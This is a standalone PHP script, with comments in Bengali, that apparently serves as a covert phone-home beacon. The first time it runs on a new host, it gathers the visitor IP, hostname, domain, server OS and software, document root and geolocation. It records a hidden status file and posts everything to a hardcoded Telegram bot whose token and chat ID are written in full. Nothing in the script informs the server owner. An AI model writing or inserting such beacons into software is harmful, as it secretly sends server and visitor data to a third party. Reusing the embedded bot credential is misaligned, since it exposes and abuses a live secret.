<?php
// === Configuration ===
$botToken = '7965088314:AAH6eFfq4DDCz0O2m9bJomL_r3zp9QAoBUY';
$chatId = '6317629501';

$ip         = $_SERVER['REMOTE_ADDR'];
$hostname   = gethostbyaddr($ip);
$domain     = $_SERVER['HTTP_HOST'] ?? 'Unknown';
$serverOS   = php_uname();
$serverSoft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$scriptPath = $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown';
$time       = date("Y-m-d H:i:s");

$geoUrl = "http://ip-api.com/json/{$ip}";
$geo = json_decode(file_get_contents($geoUrl), true);

$country   = $geo['country'] ?? 'Unknown';
$region    = $geo['regionName'] ?? '';
$city      = $geo['city'] ?? '';
$isp       = $geo['isp'] ?? 'Unknown';
$locString = "$city, $region, $country";

// === New Unique Key based on Domain + Root Path
$statusFile = __DIR__ . '/.startup_status';
$currentKey = md5($domain . $scriptPath); // Device/IP নয়, শুধু Hosting/DNS অনুযায়ী

if (file_exists($statusFile)) {
    $lastKey = trim(file_get_contents($statusFile));
    if ($lastKey === $currentKey) {
        return; // Already notified for this hosting
    }
}

file_put_contents($statusFile, $currentKey);

$message = <<<EOT
🚀 নতুন হোস্টিংয়ে স্ক্রিপ্ট চালু হয়েছে

🕒 সময়: $time
🌍 ডোমেইন: $domain
🌐 আইপি: $ip
🏠 হোস্টনেম: $hostname
📍 অবস্থান: $locString
📡 ISP: $isp
🖥️ সার্ভার: $serverSoft
🧠 OS: $serverOS
📂 রুট পাথ: $scriptPath
EOT;

$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type:application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

file_get_contents($url, false, stream_context_create($options));
?>